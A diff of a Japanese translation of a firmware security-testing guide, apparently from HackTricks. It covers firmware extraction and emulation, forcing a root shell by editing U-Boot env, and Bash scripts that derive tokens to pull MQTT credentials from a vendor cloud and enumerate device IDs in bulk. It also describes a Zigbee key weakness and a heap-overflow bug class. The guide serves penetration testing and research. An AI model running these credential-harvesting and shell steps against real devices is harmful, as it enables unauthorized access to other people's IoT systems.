@@ -6,7 +6,7 @@
 ../../generic-methodologies-and-resources/pentesting-network/dds-rtps-security.md
 {{#endref}}
 
-## **Introduction**
+## **はじめに**
 
 ### 関連リソース
 
@@ -30,55 +30,56 @@ android-mediatek-secure-boot-bl2_ext-bypass-el3.md
 mediatek-xflash-carbonara-da2-hash-bypass.md
 {{#endref}}
 
-Firmwareは、hardwareコンポーネントとユーザーが操作するsoftware間の通信を管理および促進することで、デバイスを正しく動作させるために不可欠なsoftwareです。Firmwareは永続メモリに保存されるため、デバイスの電源が入った瞬間から重要な命令にアクセスでき、operating systemの起動につながります。Firmwareを調査し、場合によっては変更することは、security vulnerabilitiesを特定するための重要な手順です。<sup>[[2]](#references)[[3]](#references)</sup>
+Firmwareは、ハードウェアコンポーネントとユーザーが操作するソフトウェア間の通信を管理・促進し、デバイスが正しく動作できるようにする不可欠なソフトウェアです。永続メモリに保存されているため、デバイスは電源投入直後から重要な命令にアクセスでき、オペレーティングシステムの起動につながります。セキュリティ上の脆弱性を特定するうえで、Firmwareの調査や改変の可能性を検討することは重要なステップです。<sup>[[2]](#references)[[3]](#references)</sup>
 
 ## **情報収集**
 
-**情報収集**は、デバイスの構成と使用されているtechnologyを理解するための重要な初期ステップです。このプロセスでは、以下のデータを収集します。
+**情報収集**は、デバイスの構成や使用されている技術を把握するための重要な初期ステップです。このプロセスでは、次の情報を収集します。
 
-- CPU architectureと実行されるoperating system
+- CPUアーキテクチャと実行しているオペレーティングシステム
 - Bootloaderの詳細
-- Hardware layoutとdatasheet
-- Codebaseの指標とsourceの場所
-- External libraryとlicenseの種類
-- Update履歴と規制上のcertification
-- Architectureおよびflow diagram
-- Security assessmentと特定されたvulnerability
+- ハードウェアの構成とデータシート
+- コードベースの規模やソースの場所
+- 外部ライブラリとライセンスの種類
+- アップデート履歴と規制認証
+- アーキテクチャ図とフロー図
+- セキュリティ評価と特定された脆弱性
 
-この目的において、**open-source intelligence (OSINT)** toolsは非常に有用です。また、利用可能なopen-source software componentsを手動および自動のreview processで分析することも重要です。[Coverity Scan](https://scan.coverity.com)や[Semmle’s LGTM](https://lgtm.com/#explore)などのtoolsでは、potential issueの発見に活用できる無料のstatic analysisを実行できます。
+この目的には、**open-source intelligence (OSINT)** ツールが非常に有用です。また、利用可能なオープンソースソフトウェアコンポーネントを手動および自動でレビューして分析することも役立ちます。[Coverity Scan](https://scan.coverity.com) や [Semmle’s LGTM](https://lgtm.com/#explore) などのツールは、潜在的な問題の発見に活用できる無料の静的解析を提供します。
 
 ## **Firmwareの取得**
 
-Firmwareはさまざまな方法で取得できますが、それぞれ複雑さのレベルが異なります。
+Firmwareの取得には、複雑さの異なるさまざまな方法があります。
 
-- **直接**source（developer、manufacturer）から取得する
-- 提供された手順に従って**build**する
-- 公式support siteから**download**する
-- ホストされているfirmware fileを探すために**Google dork** queryを使用する
-- [S3Scanner](https://github.com/sa7mon/S3Scanner)などのtoolsを使って**cloud storage**に直接アクセスする
-- man-in-the-middle techniqueによって**update**をinterceptする
-- **UART**、**JTAG**、**PICit**などのconnectionを通じてデバイスから**extract**する
-- デバイス間通信内のupdate requestを**sniff**する
-- **hardcoded update endpoint**を特定して使用する
-- bootloaderまたはnetworkから**dump**する
-- 他の方法がすべて失敗した場合、適切なhardware toolを使ってstorage chipを**removeしてread**する
+- 開発者やメーカーなどの提供元から**直接取得**する
+- 提供された手順に従って**ビルド**する
+- 公式サポートサイトから**ダウンロード**する
+- ホストされているFirmwareファイルを見つけるために**Google dork**クエリを利用する
+- [S3Scanner](https://github.com/sa7mon/S3Scanner) などのツールを使い、**cloud storage**に直接アクセスする
+- man-in-the-middle技術で**アップデートを傍受**する
+- **UART**、**JTAG**、**PICit**などを介してデバイスから**抽出**する
+- デバイスとの通信を監視して、アップデート要求を**スニッフィング**する
+- **ハードコードされたアップデートエンドポイント**を特定して利用する
+- Bootloaderやネットワークから**ダンプ**する
+- 他の方法がすべて失敗した場合、適切なハードウェアツールを使ってストレージチップを**取り外して読み取る**
 
-### UART-only logs: flash内のU-Boot envによるroot shellの強制
+### UARTのみのログ: フラッシュ上のU-Boot envを使ってroot shellを強制する
 
-UART RXが無視される場合（logsのみ）、**U-Boot environment blobをofflineで編集**することで、init shellを強制的に起動できます。<sup>[[6]](#references)</sup>
+UART RXが無視される場合（ログの読み取りのみ可能な場合）でも、オフラインで**U-Boot環境のblobを編集**すれば、init shellを強制できます。<sup>[[6]](#references)</sup>
 
-1. SOIC-8 clipとprogrammer（3.3V）を使ってSPI flashをdumpします。
-```bash
-flashrom -p ch341a_spi -r flash.bin
-```
-2. U-Boot env partitionを特定し、`bootargs`を編集して`init=/bin/sh`を含め、**U-Boot env CRC32をblobに対して再計算**します。
-3. env partitionのみをreflashしてrebootします。UART上にshellが表示されるはずです。
+1. SOIC-8クリップとプログラマー（3.3V）を使ってSPI flashをダンプする。
+   ```bash
+   flashrom -p ch341a_spi -r flash.bin
+   ```
+2. U-Boot env partitionを特定し、`bootargs`を編集して`init=/bin/sh`を含め、blobの**U-Boot env CRC32を再計算**します。
+3. env partitionのみを再フラッシュして再起動すると、UART上にshellが表示されます。
 
-これは、bootloader shellが無効化されている一方、external flash accessによってenv partitionを書き込み可能なembedded deviceで有用です。
+これは、bootloader shellは無効になっているものの、外部flashアクセスでenv partitionに書き込める組み込みデバイスで役立ちます。
 
-## Firmwareの分析
+## ファームウェアの解析
 
-**Firmwareを入手した**ので、どのように扱うべきかを把握するために、その情報をextractする必要があります。そのために使用できるさまざまなtoolsがあります。
+**ファームウェアを入手した**ので、どのように扱うかを把握するために情報を抽出する必要があります。そのために使えるツールは次のとおりです。
+
 ```bash
 file <bin>
 strings -n8 <bin>
@@ -87,25 +88,27 @@ hexdump -C -n 512 <bin> > hexdump.out
 hexdump -C <bin> | head # might find signatures in header
 fdisk -lu <bin> #lists a drives partition and filesystems if multiple
 ```
-それらのツールであまり見つからない場合は、`binwalk -E <bin>` を使ってイメージの **entropy** を確認してください。entropy が低い場合、暗号化されている可能性は低いです。entropy が高い場合、暗号化されている可能性があります（または何らかの方法で圧縮されています）。
 
-さらに、これらのツールを使用して **firmware 内に埋め込まれたファイル** を抽出できます：
+これらのツールであまり見つからない場合は、`binwalk -E <bin>` でイメージの**entropy**を確認してください。entropyが低ければ、暗号化されていない可能性が高いです。高ければ、暗号化されている（または何らかの方法で圧縮されている）可能性が高いです。
+
+さらに、以下のツールを使って**ファームウェア内に埋め込まれたファイル**を抽出できます。
 
 
 {{#ref}}
 ../../generic-methodologies-and-resources/basic-forensic-methodology/partitions-file-systems-carving/file-data-carving-recovery-tools.md
 {{#endref}}
 
-または [**binvis.io**](https://binvis.io/#/) ([code](https://code.google.com/archive/p/binvis/)) を使用してファイルを調査できます。
+または、[**binvis.io**](https://binvis.io/#/) ([code](https://code.google.com/archive/p/binvis/)) を使ってファイルを調べることもできます。
 
 ### ファイルシステムの取得
 
-先ほど説明した `binwalk -ev <bin>` などのツールを使用すれば、**ファイルシステムを抽出**できているはずです。\
-Binwalk は通常、ファイルシステムを **ファイルシステムの種類にちなんだ名前のフォルダー** 内に抽出します。通常、次のいずれかです：squashfs、ubifs、romfs、rootfs、jffs2、yaffs2、cramfs、initramfs。
+先ほど紹介した `binwalk -ev <bin>` などのツールを使えば、**ファイルシステムを抽出**できているはずです。\
+Binwalkは通常、ファイルシステムの種類を名前にした**フォルダー**内に抽出します。一般的な種類は、squashfs、ubifs、romfs、rootfs、jffs2、yaffs2、cramfs、initramfsです。
 
 #### ファイルシステムの手動抽出
 
-場合によっては、binwalk の signatures にファイルシステムの **magic byte** が含まれていないことがあります。この場合は、binwalk を使用して **ファイルシステムの offset を特定し、バイナリから圧縮されたファイルシステムを carve して**、以下の手順に従い、その種類に応じてファイルシステムを **手動で抽出**してください。
+場合によっては、binwalkのシグネチャにファイルシステムの**magic byte**が含まれていないことがあります。その場合は、binwalkを使って**ファイルシステムのオフセットを特定し、圧縮されたファイルシステムをバイナリから切り出して**、以下の手順に従い、種類に応じて**手動で抽出**してください。
+
 ```
 $ binwalk DIR850L_REVB.bin
 
@@ -117,7 +120,9 @@ DECIMAL HEXADECIMAL DESCRIPTION
 1704052 0x1A0074 PackImg section delimiter tag, little endian size: 32256 bytes; big endian size: 8257536 bytes
 1704084 0x1A0094 Squashfs filesystem, little endian, version 4.0, compression:lzma, size: 8256900 bytes, 2688 inodes, blocksize: 131072 bytes, created: 2016-07-12 02:28:41
 ```
-以下の **dd command** を実行して Squashfs ファイルシステムをカービングします。
+
+Squashfs ファイルシステムを carve するため、以下の **dd command** を実行します。
+
 ```
 $ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs
 
@@ -127,37 +132,39 @@ $ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs
 
 8257536 bytes (8.3 MB, 7.9 MiB) copied, 12.5777 s, 657 kB/s
 ```
-また、以下のコマンドを実行することもできます。
+
+または、次のコマンドを実行することもできます。
 
 `$ dd if=DIR850L_REVB.bin bs=1 skip=$((0x1A0094)) of=dir.squashfs`
 
-- squashfs（上記の例で使用）
+- squashfs の場合（上記の例で使用）
 
 `$ unsquashfs dir.squashfs`
 
-その後、ファイルは "`squashfs-root`" ディレクトリ内に展開されます。
+実行後、ファイルは "`squashfs-root`" ディレクトリ内にあります。
 
-- CPIO archive ファイル
+- CPIO アーカイブファイル
 
 `$ cpio -ivd --no-absolute-filenames -F <bin>`
 
-- jffs2 filesystem の場合
+- jffs2 ファイルシステムの場合
 
 `$ jefferson rootfsfile.jffs2`
 
-- NAND flash を使用する ubifs filesystem の場合
+- NAND フラッシュを使用する ubifs ファイルシステムの場合
 
 `$ ubireader_extract_images -u UBI -s <start_offset> <bin>`
 
 `$ ubidump.py <bin>`
 
-## Firmware の分析
+## ファームウェアの分析
 
-Firmware を取得したら、その構造と潜在的な脆弱性を理解するために、詳細に解析することが重要です。このプロセスでは、さまざまなツールを使用して firmware image を分析し、貴重なデータを抽出します。
+ファームウェアを入手したら、その構造や潜在的な脆弱性を理解するために、詳しく調査することが重要です。このプロセスでは、さまざまなツールを使用してファームウェアイメージを分析し、価値のあるデータを抽出します。
 
 ### 初期分析ツール
 
-binary file（`<bin>` と表記）の初期調査に使用する一連のコマンドを以下に示します。これらのコマンドは、file type の特定、strings の抽出、binary data の分析、partition と filesystem の詳細の把握に役立ちます。
+バイナリファイル（`<bin>` と表記）を最初に調査するためのコマンドをいくつか紹介します。これらのコマンドを使うと、ファイルの種類を特定し、文字列を抽出し、バイナリデータを分析して、パーティションやファイルシステムの詳細を把握できます。
+
 ```bash
 file <bin>
 strings -n8 <bin>
@@ -166,146 +173,166 @@ hexdump -C -n 512 <bin> > hexdump.out
 hexdump -C <bin> | head #useful for finding signatures in the header
 fdisk -lu <bin> #lists partitions and filesystems, if there are multiple
 ```
-イメージの暗号化状態を評価するには、`binwalk -E <bin>` を使用して **entropy** を確認します。低い entropy は暗号化されていない可能性を示し、高い entropy は暗号化または圧縮の可能性を示します。
 
-**埋め込みファイル**を抽出するには、**file-data-carving-recovery-tools** documentation や、ファイル検査用の **binvis.io** などの tools and resources が推奨されます。
+イメージの暗号化状態を評価するには、`binwalk -E <bin>` を使って**エントロピー**を確認します。エントロピーが低い場合は暗号化されていない可能性が高く、エントロピーが高い場合は暗号化または圧縮されている可能性があります。
+
+**埋め込みファイル**の抽出には、**file-data-carving-recovery-tools** のドキュメントや、ファイル検査用の **binvis.io** などのツールやリソースが推奨されます。
 
 ### ファイルシステムの抽出
 
-`binwalk -ev <bin>` を使用すると、通常はファイルシステムを抽出でき、多くの場合、ファイルシステムの種類にちなんだ名前（例: squashfs、ubifs）の directory に保存されます。ただし、**binwalk** が magic bytes の欠落によりファイルシステムの種類を認識できない場合は、手動での抽出が必要です。これには、`binwalk` を使用してファイルシステムの offset を特定し、その後 `dd` command でファイルシステムを carve out します。
+`binwalk -ev <bin>` を使うと、通常はファイルシステムを抽出できます。多くの場合、ファイルシステムの種類にちなんだ名前のディレクトリ（例: squashfs、ubifs）に抽出されます。ただし、magic bytes がないために **binwalk** がファイルシステムの種類を認識できない場合は、手動で抽出する必要があります。その場合は、`binwalk` でファイルシステムのオフセットを特定してから、`dd` コマンドでファイルシステムを切り出します。
+
 ```bash
 $ binwalk DIR850L_REVB.bin
 
 $ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs
 ```
-その後、filesystem の種類（例: squashfs、cpio、jffs2、ubifs）に応じて、内容を手動で抽出するために異なるコマンドを使用します。
+
+その後、filesystemの種類（例: squashfs、cpio、jffs2、ubifs）に応じて、内容を手動で抽出するために異なるコマンドを使用します。
 
 ### Filesystem Analysis
 
-filesystem の抽出が完了すると、security flaw の検索を開始します。安全でない network daemon、hardcoded credential、API endpoint、update server の機能、未コンパイルの code、startup script、offline analysis 用の compiled binary に注意を払います。
+filesystemを抽出したら、security flawの調査を開始します。安全でないnetwork daemon、hardcoded credential、API endpoint、update serverの機能、未コンパイルのコード、startup script、オフライン分析用のcompiled binaryに注目します。
 
-**主な場所**と検査対象には、以下が含まれます。
+**確認すべき主要な場所**と**項目**には、次のものがあります。
 
-- ユーザー credential を確認する **etc/shadow** と **etc/passwd**
-- **etc/ssl** 内の SSL certificate と key
-- 潜在的な vulnerability を確認するための configuration file と script file
-- さらなる analysis 用の embedded binary
-- 一般的な IoT device の web server と binary
+- ユーザーcredentialを含む **etc/shadow** と **etc/passwd**
+- **etc/ssl** 内のSSL certificateとkey
+- 脆弱性の可能性がある設定ファイルとscript file
+- 追加分析用のembedded binary
+- 一般的なIoT deviceのweb serverとbinary
 
-filesystem 内の機密情報と vulnerability の発見には、複数の tool が役立ちます。
+filesystem内の機密情報や脆弱性の発見には、次のようなツールが役立ちます。
 
-- 機密情報の検索用の [**LinPEAS**](https://github.com/carlospolop/PEASS-ng) と [**Firmwalker**](https://github.com/craigz28/firmwalker)
-- 包括的な firmware analysis 用の [**The Firmware Analysis and Comparison Tool (FACT)**](https://github.com/fkie-cad/FACT_core)
-- static analysis と dynamic analysis 用の [**FwAnalyzer**](https://github.com/cruise-automation/fwanalyzer)、[**ByteSweep**](https://gitlab.com/bytesweep/bytesweep)、[**ByteSweep-go**](https://gitlab.com/bytesweep/bytesweep-go)、[**EMBA**](https://github.com/e-m-b-a/emba)
+- 機密情報の検索には、[**LinPEAS**](https://github.com/carlospolop/PEASS-ng) と [**Firmwalker**](https://github.com/craigz28/firmwalker)
+- 包括的なfirmware分析には、[**The Firmware Analysis and Comparison Tool (FACT)**](https://github.com/fkie-cad/FACT_core)
+- 静的・動的分析には、[**FwAnalyzer**](https://github.com/cruise-automation/fwanalyzer)、[**ByteSweep**](https://gitlab.com/bytesweep/bytesweep)、[**ByteSweep-go**](https://gitlab.com/bytesweep/bytesweep-go)、[**EMBA**](https://github.com/e-m-b-a/emba)
 
-### Compiled Binary の Security Check
+### Compiled BinaryのSecurity Check
 
-filesystem 内で見つかった source code と compiled binary は、vulnerability がないか綿密に調査する必要があります。Unix binary 用の **checksec.sh** や Windows binary 用の **PESecurity** などの tool は、悪用される可能性のある保護されていない binary の特定に役立ちます。
+filesystem内で見つかったsource codeとcompiled binaryの両方について、脆弱性がないか精査する必要があります。Unix binary用の**checksec.sh**やWindows binary用の**PESecurity**などのツールを使うと、悪用される可能性のある保護されていないbinaryを特定できます。
 
-## Derived URL Token を介した cloud config と MQTT credential の取得
+## 導出されたURL tokenを使ったcloud configとMQTT credentialの取得
 
-多くの IoT hub は、次のような cloud endpoint から device ごとの configuration を取得します。<sup>[[5]](#references)</sup>
+多くのIoT hubは、次のようなcloud endpointからデバイスごとの設定を取得します。<sup>[[5]](#references)</sup>
 
 - `https://<api-host>/pf/<deviceId>/<token>`
 
-firmware analysis 中に、`<token>` が hardcoded secret を使用して device ID から locally derived されていることが判明する場合があります。例えば、以下のようになります。
+firmware分析中に、たとえば次のように、hardcoded secretを使って`<token>`がdevice IDからローカルで導出されていることが判明する場合があります。
 
-- token = MD5( deviceId || STATIC_KEY ) and represented as uppercase hex
+- token = MD5( deviceId || STATIC_KEY )。大文字の16進数で表される
 
-この設計では、deviceId と STATIC_KEY を知っている者が URL を再構築し、cloud config を取得できます。その結果、plaintext の MQTT credential と topic prefix が明らかになることがよくあります。
+この設計では、deviceIdとSTATIC_KEYを知っている人なら誰でもURLを再構築し、cloud configを取得できます。多くの場合、これによって平文のMQTT credentialやtopic prefixが明らかになります。
 
-実践的な workflow:
+実践的な手順:
 
-1) UART boot log から deviceId を抽出する
+1) UART boot logからdeviceIdを抽出する
 
-- 3.3V UART adapter（TX/RX/GND）を接続し、log を取得します。
+- 3.3V UART adapter（TX/RX/GND）を接続し、ログを取得します。
+
 ```bash
 picocom -b 115200 /dev/ttyUSB0
 ```
-- cloud config URLパターンとbroker addressを出力している行を探します。例：
+
+- cloud config URLのパターンとbrokerアドレスを出力する行を探します。たとえば次のような行です。
+
 ```
 Online Config URL https://api.vendor.tld/pf/<deviceId>/<token>
 MQTT: mqtt://mq-gw.vendor.tld:8001
 ```
-2) firmware から STATIC_KEY と token algorithm を復元する
 
-- バイナリを Ghidra/radare2 に読み込み、config path（"/pf/"）または MD5 の使用箇所を検索する。
+2) firmwareからSTATIC_KEYとtoken algorithmを復元する
+
+- バイナリをGhidra/radare2に読み込み、config path（"/pf/"）またはMD5の使用箇所を検索する。
 - algorithm（例: MD5(deviceId||STATIC_KEY)）を確認する。
-- Bash で token を導出し、digest を大文字にする:
+- Bashでtokenを導出し、digestを大文字にする:
+
 ```bash
 DEVICE_ID="d88b00112233"
 STATIC_KEY="cf50deadbeefcafebabe"
 printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}'
 ```
-3) cloud config と MQTT credentials の収集
 
-- URLを組み立て、curlでJSONを取得し、jqで解析してsecretを抽出する：
+3) Cloud config と MQTT credentials を収集する
+
+- URL を組み立て、curl で JSON を取得し、jq で解析して secrets を抽出する:
+
 ```bash
 API_HOST="https://api.vendor.tld"
 TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
 curl -sS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq .
 # Fields often include: mqtt host/port, clientId, username, password, topic prefix (tpkfix)
 ```
-4) 平文 MQTT と脆弱な topic ACL（存在する場合）の悪用
 
-- 復元した credentials を使用して maintenance topic を subscribe し、sensitive event を探す:
+4) 平文 MQTT と弱い topic ACL（存在する場合）を悪用する
+
+- 回収した認証情報を使ってメンテナンス用 topic を subscribe し、機密性の高いイベントを探す:
+
 ```bash
 mosquitto_sub -h <broker> -p <port> -V mqttv311 \
--i <client_id> -u <username> -P <password> \
--t "<topic_prefix>/<deviceId>/admin" -v
+  -i <client_id> -u <username> -P <password> \
+  -t "<topic_prefix>/<deviceId>/admin" -v
 ```
-5) 予測可能なデバイスIDを列挙する（大規模に、許可を得て）
 
-- 多くのエコシステムでは、vendor OUI／製品／タイプのバイトに連番のサフィックスを続けた形式が使用されています。
-- 候補IDを反復処理し、トークンを導出して、プログラムで設定を取得できます:
+5) 予測可能なデバイス ID を列挙する（認可を得たうえで、大規模に）
+
+- 多くのエコシステムでは、ベンダー OUI／製品／タイプのバイト列の後に連番のサフィックスが埋め込まれています。
+- 候補 ID を順に試し、トークンを導出して、設定をプログラムで取得できます。
+
 ```bash
 API_HOST="https://api.vendor.tld"; STATIC_KEY="cf50deadbeef"; PREFIX="d88b1603" # OUI+type
 for SUF in $(seq -w 000000 0000FF); do
-DEVICE_ID="${PREFIX}${SUF}"
-TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
-curl -fsS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq -r '.mqtt.username,.mqtt.password' | sed "/null/d" && echo "$DEVICE_ID"
+  DEVICE_ID="${PREFIX}${SUF}"
+  TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
+  curl -fsS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq -r '.mqtt.username,.mqtt.password' | sed "/null/d" && echo "$DEVICE_ID"
 done
 ```
+
 Notes
-- mass enumerationを試みる前に、必ず明示的な承認を取得してください。
-- 可能な場合は、target hardwareを変更せずにsecretを復元するため、emulationまたはstatic analysisを優先してください。
+- 大量の列挙を試みる前に、必ず明示的な許可を得てください。
+- 可能であれば、対象ハードウェアを変更せずに秘密情報を復元するため、emulation または static analysis を優先してください。
 
 
-firmwareをemulationするプロセスにより、deviceの動作または個々のprogramの**dynamic analysis**が可能になります。このアプローチでは、hardwareやarchitectureへの依存関係が原因で課題に直面することがありますが、root filesystemまたは特定のbinaryを、Raspberry Piなどのarchitectureとendiannessが一致するdevice、あるいは事前構築済みのvirtual machineに転送することで、さらなるtestingが可能になります。
+firmware を emulation することで、デバイスの動作や個々のプログラムの **dynamic analysis** が可能になります。この方法では、ハードウェアやアーキテクチャへの依存が課題となることがありますが、root filesystem や特定のバイナリを、Raspberry Pi などのアーキテクチャとエンディアンが一致するデバイス、または事前構築済みの仮想マシンに転送すると、さらにテストを進めやすくなります。
 
-### 個々のBinaryのEmulation
+### 個々のバイナリの emulation
 
-単一のprogramを調査する場合、programのendiannessとCPU architectureを特定することが重要です。
+単一のプログラムを調査する場合、プログラムのエンディアンと CPU アーキテクチャを特定することが重要です。
 
-#### MIPS Architectureの例
+#### MIPS アーキテクチャの例
 
-MIPS architectureのbinaryをemulationするには、次のcommandを使用できます：
+MIPS アーキテクチャのバイナリを emulation するには、次のコマンドを使用できます。
+
 ```bash
 file ./squashfs-root/bin/busybox
 ```
-そして、必要なエミュレーションツールをインストールするには:
+
+また、必要なエミュレーションツールをインストールするには:
+
 ```bash
 sudo apt-get install qemu qemu-user qemu-user-static qemu-system-arm qemu-system-mips qemu-system-x86 qemu-utils
 ```
-MIPS（big-endian）では`qemu-mips`を使用し、little-endianバイナリには`qemu-mipsel`を選択します。
+
+MIPS（ビッグエンディアン）では `qemu-mips` を使用し、リトルエンディアンのバイナリには `qemu-mipsel` を使用します。
 
 #### ARM Architecture Emulation
 
-ARMバイナリの場合もプロセスは同様で、エミュレーションには`qemu-arm`エミュレーターを使用します。
+ARMバイナリの場合も同様の手順で、エミュレーションには `qemu-arm` エミュレーターを使用します。
 
 ### Full System Emulation
 
-[Firmadyne](https://github.com/firmadyne/firmadyne)、[Firmware Analysis Toolkit](https://github.com/attify/firmware-analysis-toolkit)などのツールを使用すると、ファームウェア全体のエミュレーションが可能になり、プロセスを自動化して動的解析を支援できます。
+[Firmadyne](https://github.com/firmadyne/firmadyne)、[Firmware Analysis Toolkit](https://github.com/attify/firmware-analysis-toolkit) などのツールを使うと、ファームウェア全体のエミュレーションが可能です。これらのツールはプロセスを自動化し、動的解析を支援します。
 
 ## Dynamic Analysis in Practice
 
-この段階では、実機またはエミュレートされたデバイス環境を解析に使用します。OSとファイルシステムへのshellアクセスを維持することが重要です。エミュレーションではハードウェアとのやり取りを完全には再現できない場合があるため、エミュレーションを再起動する必要が生じることがあります。解析ではファイルシステムを再確認し、公開されているWebページやネットワークサービスをexploitし、bootloaderの脆弱性を調査する必要があります。潜在的なバックドアの脆弱性を特定するには、ファームウェアの整合性テストが重要です。
+この段階では、実機またはエミュレートされたデバイス環境を使って解析します。OSとファイルシステムへの shell access を維持することが重要です。エミュレーションではハードウェアとのやり取りを完全には再現できない場合があり、その際はエミュレーションを再起動する必要があります。解析では、ファイルシステムを再確認し、公開されているWebページやネットワークサービスを exploit し、ブートローダーの脆弱性を調査します。潜在的なバックドアの脆弱性を特定するには、ファームウェアの整合性テストが不可欠です。
 
 ## Runtime Analysis Techniques
 
-Runtime analysisでは、gdb-multiarch、Frida、Ghidraなどのツールを使用して、プロセスまたはバイナリが動作する環境内で操作します。ブレークポイントの設定や、fuzzingなどの手法による脆弱性の特定を行います。
+Runtime analysis では、gdb-multiarch、Frida、Ghidra などのツールを使い、実行環境内のプロセスやバイナリを操作します。ブレークポイントを設定し、fuzzing などの手法で脆弱性を特定します。
 
-完全なdebuggerを使用できないembedded targetでは、**静的リンクされた`gdbserver`をデバイスにコピーして、リモートでattachします**。<sup>[[6]](#references)</sup>
+完全なデバッガーを使えない組み込みターゲットでは、静的リンクされた `gdbserver` をデバイスに**コピー**して、リモートから接続します。<sup>[[6]](#references)</sup>
+
 ```bash
 # On device
 gdbserver :1234 /usr/bin/targetd
@@ -316,193 +343,199 @@ gdbserver :1234 /usr/bin/targetd
 gdb-multiarch /path/to/targetd
 target remote <device-ip>:1234
 ```
+
 ### Zigbee / radio-co-processor message mapping
 
-IoT hub では、RF stack が **radio MCU** と Linux userland process の間で分割されていることがよくあります。実用的な workflow は、次の path を mapping することです:<sup>[[8]](#references)</sup>
+IoT hubでは、RF stackが**radio MCU**とLinux userland processに分割されていることがよくあります。有用な手順は、次の経路をマッピングすることです。<sup>[[8]](#references)</sup>
 
-1. **RF frame** on the air
-2. **controller-side parser** in the radio MCU
-3. **serial/UART text or TLV protocol** forwarded to Linux (for example `/dev/tty*`)
-4. **application dispatcher** in the main daemon
+1. 無線上の**RF frame**
+2. radio MCU上の**controller-side parser**
+3. Linuxに転送される**serial/UART textまたはTLV protocol**（例: `/dev/tty*`）
+4. メインdaemon内の**application dispatcher**
 5. **protocol-specific handler / state machine**
 
-この architecture では、reversing target が 1 つではなく 2 つになります。controller が binary radio frame を `Group,Command,arg1,arg2,...` のような textual protocol に変換する場合は、次の項目を特定します。
+このアーキテクチャでは、reverse engineeringの対象が1つではなく2つになります。controllerがbinary radio frameを`Group,Command,arg1,arg2,...`のようなtext protocolに変換している場合、次の情報を特定します。
 
-- **message groups** と dispatch tables
-- どの message が **network** から送信可能で、どれが controller 自体から送信されるか
-- 正確な **manufacturer-specific discriminator fields** (例: Zigbee の `manufacturer_code` と custom `cluster_command`)
-- **commissioning**、discovery、または firmware/model download phases 中にのみ到達可能な handler
+- **message group**とdispatch table
+- どのmessageが**network**由来で、どれがcontroller自身から来るか
+- 正確な**manufacturer-specific discriminator field**（例: Zigbeeの`manufacturer_code`やcustom `cluster_command`）
+- **commissioning**、discovery、firmware/model downloadの段階でのみ到達可能なhandler
 
-Zigbee では、pairing traffic を capture し、target がまだ default **Link Key** `ZigBeeAlliance09` に依存しているか確認します。依存している場合、commissioning traffic の sniffing によって **Network Key** が露出する可能性があります。Zigbee 3.0 install codes はこの exposure を低減するため、tested device が実際にそれらを enforce しているかを記録します。
+特にZigbeeでは、pairing時のtrafficをcaptureし、対象がデフォルトの**Link Key** `ZigBeeAlliance09`に依存しているか確認します。依存している場合、commissioning trafficをsniffすると**Network Key**が漏洩する可能性があります。Zigbee 3.0のinstall codeはこのリスクを軽減するため、テスト対象のdeviceで実際に強制されているか確認します。
 
-### Manufacturer-specific protocol handlers and FSM-gated reachability
+### Manufacturer-specific protocol handlerとFSMで制御された到達可能性
 
-Vendor-specific Zigbee/ZCL commands は、standardized clusters よりも優れた target になることがよくあります。これは、十分に battle-tested されていない **custom parsing code** と internal **FSMs** に入力されるためです。<sup>[[8]](#references)</sup>
+Vendor-specificなZigbee/ZCL commandは、standardized clusterよりも有力なターゲットになることがあります。より十分に検証されていない**custom parsing code**や内部**FSM**に入力されるためです。<sup>[[8]](#references)</sup>
 
-実用的な workflow:
+実践的な手順:
 
-- command dispatcher を reverse し、**vendor-only handler** を見つけます。
-- **FSM state**、**event**、**check**、**action**、**next-state** tables を復元します。
-- auto-advance する **transitional states** と、最終的に attacker-controlled state を reset または free する retry/error branches を特定します。
-- buggy handler が常に reachable だと仮定せず、daemon を vulnerable state に移行させるために必要な正当な protocol exchanges を確認します。
+- command dispatcherをreverseし、**vendor-only handler**を見つける。
+- **FSM state**、**event**、**check**、**action**、**next-state**のtableを特定する。
+- 自動的に次へ進む**transitional state**と、最終的にattacker-controlled stateをresetまたはfreeするretry/error branchを特定する。
+- buggy handlerが常に到達可能だと決めつけず、daemonをvulnerable stateに置くために必要な正規のprotocol exchangeを確認する。
 
-Timing-sensitive protocols では、Python framework からの packet replay は遅すぎる場合があります。より reliable な approach は、vendor-grade stack を使用して real hardware (例: **nRF52840**) 上で legitimate device を emulate することです。これにより、正しい **endpoints**、**attributes**、および commissioning timing を提供できます。
+タイミングに敏感なprotocolでは、Python frameworkからのpacket replayは遅すぎることがあります。より確実な方法は、vendor-grade stackを備えた実機（例: **nRF52840**）で正規のdeviceをemulateし、適切な**endpoint**、**attribute**、commissioning timingを再現することです。
 
-### Fragmented-download bug class in embedded daemons
+### Embedded daemonにおけるfragmented-download bug class
 
-**fragmented blob/model/configuration downloads** では、繰り返し発生する firmware bug class が存在します:<sup>[[8]](#references)</sup>
+**fragmented blob/model/configuration download**では、次のようなfirmware bugが繰り返し見られます。<sup>[[8]](#references)</sup>
 
-1. **first fragment** (`offset == 0`) が `ctx->total_size` を保存し、`malloc(total_size)` を実行します。
-2. 後続の fragments は、`packet_total_size >= offset + chunk_len` のような attacker-controlled **packet-local** fields のみを validate します。
-3. copy は、元の allocated size に対する check なしで `memcpy(&ctx->buffer[offset], chunk, chunk_len)` を実行します。
+1. **first fragment**（`offset == 0`）で`ctx->total_size`を保存し、`malloc(total_size)`で割り当てる。
+2. 後続fragmentでは、`packet_total_size >= offset + chunk_len`のような、attacker-controlledな**packet-local** fieldしか検証しない。
+3. **original allocated size**との照合をせずに、`memcpy(&ctx->buffer[offset], chunk, chunk_len)`でcopyする。
 
-これにより attacker は次を送信できます。
+これにより、攻撃者は次の操作を行えます。
 
-- **small** な declared total size を持つ first valid fragment を送り、小さな heap allocation を強制する。
